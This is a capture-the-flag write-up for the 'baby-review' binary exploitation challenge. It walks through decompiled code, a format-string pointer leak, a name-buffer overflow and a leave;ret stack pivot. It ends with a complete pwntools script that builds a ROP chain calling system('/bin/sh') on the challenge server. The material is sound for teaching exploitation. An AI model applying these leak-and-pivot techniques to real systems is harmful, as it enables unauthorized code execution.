### Description

We are given a binary with a corresponding libc file.

>I've created a fun program for you to review your favorite movies and books. Can you figure out the problem with it?
>
>`nc chals.damctf.xyz 30888`
>
>Downloads
>[baby-review](https://rctf-bucket.storage.googleapis.com/uploads/1b73a2a7dc7a506295798168b678a4a510a94b7cb536da5d0ca17398ef9e1235/baby-review), [libc.so.6](https://rctf-bucket.storage.googleapis.com/uploads/568740b06a8afa26db4874f8cf61985ecbc6dd127f4229416fe95da8f9ec13fb/libc.so.6)

---

### Recon

First of all, as this exploit relies heavily on libc specific stack pointers, i will be using [pwninit](https://github.com/io12/pwninit) to set everything up. It doesn't always work, and it can be done manually, but for this challenge, it seems to work.

Jumping into code, we first inspect the main function:

```c
void main(void)

{
  int comp;
  time_t curr_time;
  size_t len;
  char capital [64];
  undefined1 *country;
  int randint;
  
  curr_time = time((time_t *)0x0);
  srand((uint)curr_time);
  load_countries();
  puts("Alright I need to prove you\'re human so lets do some geography");
  randint = rand();
  randint = randint % num_countries;
  country = countries + (long)randint * 100;
  printf("What is the capital of %s?\n",country);
  fgets(capital,0x32,stdin);
  len = strcspn(capital,"\r\n");
  capital[len] = '\n';
  comp = strcmp(capital,country + 0x32);
  if (comp == 0) {
    puts("Correct!");
    puts("Alright I\'ll let you through");
    menu();
    return;
  }
  printf("Incorrect. The capital of %s is %s.\n",country,country + 0x32);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

An interesting twist, the program starts by asking for the capital of a country? I saw some people using specific libraries to get around this, but my solution just takes input from the user. Moving on to the menu function:

```c
void menu(void)

{
  undefined movie [303];
  char choice;
  undefined name [32];
  
  do {
    puts("What would you like to do?");
    puts("1. Read a book?");
    puts("2. Watch a movie?");
    puts("3. Review a book/movie");
    puts("4. Exit");
    __isoc99_scanf(" %c",&choice);
    getchar();
    switch(choice) {
    case '1':
      read_book();
      break;
    case '2':
      watch_movie(movie);
      break;
    case '3':
      review();
      break;
    case '4':
      puts("Sad to see you go.");
      puts("Could I get your name for my records?");
      read(0,name,48);
      return;
    case '5':
      add_movie(movie);
      break;
    default:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

So, we can either do `read_book`, `watch_movie`, `review` or `add_movie`. Interresting, the UI doesn't reveal the existence of `add_movie`. Let's check that out first.

```c
void add_movie(char *movie)

{
  char *comp;
  
  puts("Enter your movie link here and I\'ll add it to the list");
  read(0,movie,300);
  comp = strstr(movie,"%n");
  if (comp != (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```

The function simply fills the movie-buffer that we saw in menu. No overflow, however, the function does check for the pressence of "%n" in the input. This is weird, as this would usually be used in a format string exploit. Going back to menu, we check out the other function that uses the movie-buffer: `watch_movie`:

```c
void watch_movie(char *param_1)

{
  puts(&DAT_00102078);
  puts("https://www.youtube.com/watch?v=2bGvWEfLUsc");
  puts("https://www.youtube.com/watch?v=0u1oUsPWWjM");
  puts("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  puts("https://www.youtube.com/watch?v=Icx4xul9LEE");
  printf(param_1);
  return;
}
```

An easy format string vulnerability. However, as we cannot use "%n", there will be no overwriting the GOT.  This would only be used as a leak.

Jumping back up to `menu`, we see another potential vector:

```c
      puts("Sad to see you go.");
      puts("Could I get your name for my records?");
      read(0,name,48);
      return;
```

The name-buffer is only 32 bytes long, so we have an overflow of 16 bytes, straight into a return. This is obviously the way we get code execution.

---

### Pivoting the stack

Checking the disassembly, we can see the use of `leave`:

```c
        001015e4 c9              LEAVE
        001015e5 c3              RET
```

This can be both good and bad. `leave` as an instruction is quite simple, it pops `rbp` from the stack. This means, that while we have an overflow of 16 bytes, we can only call a single address. I tried experimenting with one-gadgets, but with the difference between local and remote, coupled with the quite modern libc version, none of the gadgets worked. Therefore, we must do something else.

This is where `leave` comes in to save the day. `leave` as an instruction boils down to two steps:

```asm
mov rsp, rbp
pop rbp
```

It first moves `rbp` to `rsp`, then it pops `rbp` from the stack. As we control the value popped from the stack, we can control `rbp`. If we were to call `leave` again, the program would move our attacker controlled `rbp` to `rsp`, giving us control of the stack pointer. We can then simply chose a value that points back to the beginning of our buffer, giving us space for a larger rop chain.

---

### Solution

As we have been provided with the remote libc version, i simply chose to leak the stack and the libc base address. I tested with gdb that the provided stack values corresponded, as they often don't.

```python
from pwn import *

elf = context.binary = ELF("./baby-review_patched")
libc = ELF("./libc.so.6")

context.gdbinit = "~/tools/peda/peda.py"
# conn = gdb.debug("./baby-review_patched", '''
# b *(&menu+108)
# c
# ''')

# conn = process("./baby-review_patched")
conn = connect("chals.damctf.xyz", 30888)

print(conn.recvuntil(b"?\n"))
conn.sendline(input("-> ").encode())

conn.recvuntil(b"Exit\n")
conn.sendline(b"5")  # Navigate to add_movie

conn.recvuntil(b"list\n")
conn.sendline(b"%3$p %7$p")  # libc pointer and stack pointer

conn.recvuntil(b"Exit\n")
conn.sendline(b"2")  # Navigate to watch_movie

conn.recvuntil(b"EE\n")
leak = conn.recvline()[:-1]  # Leak
libc_leak, stack_leak = leak.split(b" ")
libc_leak = eval(libc_leak)  # libc pointer
stack_leak = eval(stack_leak) + 0x130 - 8  # stack pointer - 8 (leave; ret; increments it)

libc.address = libc_leak - libc.sym["write"] - 23  # Seems to be correct both local and remote

print(f"Leaked libc base {hex(libc.address)}")
print(f"Leaked pivot address {hex(stack_leak)}")

conn.recvuntil(b"Exit\n")
conn.sendline(b"4")  # Navigate to exit

payload = p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(next(libc.search(b"/bin/sh\x00")))  # Pointer to /bin/sh
payload += p64(libc.sym["system"])  # system
payload += p64(0)
payload += p64(stack_leak)  # name - 8
payload += p64(libc.address + 0x562ec)  # leave; ret;

conn.recvuntil(b"?\n")
conn.sendline(payload)

conn.interactive()
```
